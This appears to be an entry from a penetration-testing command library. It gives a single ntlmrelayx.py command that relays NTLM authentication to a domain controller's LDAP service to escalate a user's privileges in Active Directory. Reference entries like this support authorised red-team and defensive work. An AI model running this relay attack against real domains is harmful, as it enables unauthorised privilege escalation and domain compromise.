---
id: cc72aeab-1a9c-4dd8-9376-8b1c6bc31e0e
name: NTLM RelayX escalate user to username
type: command
executor: bash
data: ntlmrelayx.py -t ldap://dc01.domain.local --escalate-user username
output: null
created_at: '2023-04-06T03:56:08.022494+00:00'
updated_at: '2023-04-10T20:26:32.381858+00:00'
---

# NTLM RelayX escalate user to username

```bash
ntlmrelayx.py -t ldap://dc01.domain.local --escalate-user username
```
